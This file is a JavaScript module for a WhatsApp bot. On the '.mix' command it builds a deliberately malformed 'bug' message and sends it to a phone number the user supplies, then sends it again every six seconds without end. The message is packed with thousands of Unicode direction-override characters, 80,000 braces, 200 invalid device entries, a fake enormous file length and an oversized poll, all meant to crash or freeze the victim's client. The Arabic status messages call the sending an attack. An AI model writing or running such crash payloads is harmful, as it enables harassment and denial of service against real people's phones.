module.exports = async ({ sock, text, reply }) => {
    if (text.startsWith('.mix')) {
        const target = text.split(' ')[1];
        if (!target) return reply('❗ أدخل الرقم الهدف بعد الأمر\nمثال: .bug 201234567890');

        reply('✅ جارٍ تنفيذ الهجوم، لا تغلق البوت...');

        async function sendBugMessage() {
            const bugMsg = {
                ephemeralMessage: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadata: {
                                        devices: new Array(200).fill({ id: "device", type: "invalid" })
                                    },
                                    deviceListMetadataVersion: 9999999999,
                                },
                                interactiveMessage: {
                                    contextInfo: {
                                        mentionedJid: ["13135550002@s.whatsapp.net"],
                                        stanzaId: "Nxth-Id" + Math.floor(Math.random() * 99999),
                                        isForwarded: true,
                                        forwardingScore: 9999,
                                        businessMessageForwardInfo: {
                                            businessOwnerJid: "13135550002@s.whatsapp.net",
                                        },
                                    },
                                    body: {
                                        text: "\u2066".repeat(3000) + "\u202E".repeat(3000) + "[".repeat(3000),
                                    },
                                    nativeFlowMessage: {
                                        name: "native_broadcast_payload",
                                        messageParamsJson: "{".repeat(80000),
                                    }
                                },
                                documentMessage: {
                                    fileName: "\u200F".repeat(6000),
                                    mimetype: "application/zip",
                                    fileLength: "999999999999",
                                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                                    mediaKeyTimestamp: "9999999999",
                                    caption: " ".repeat(7000),
                                },
                                pollCreationMessage: {
                                    name: "\u202E".repeat(7000),
                                    options: new Array(200).fill({ optionName: "[".repeat(4000) }),
                                    selectableCount: 1
                                }
                            }
                        }
                    }
                }
            };

            try {
                await sock.sendMessage(target + '@s.whatsapp.net', bugMsg);
                console.log(`✔ تم إرسال هجوم BUG إلى ${target}`);
            } catch (err) {
                console.error('❌ خطأ أثناء الإرسال:', err);
            }
        }

        // إرسال أول رسالة قوية
        await sendBugMessage();

        // تكرار الإرسال كل 6 ثوانٍ
        setInterval(sendBugMessage, 6000);
    }
};
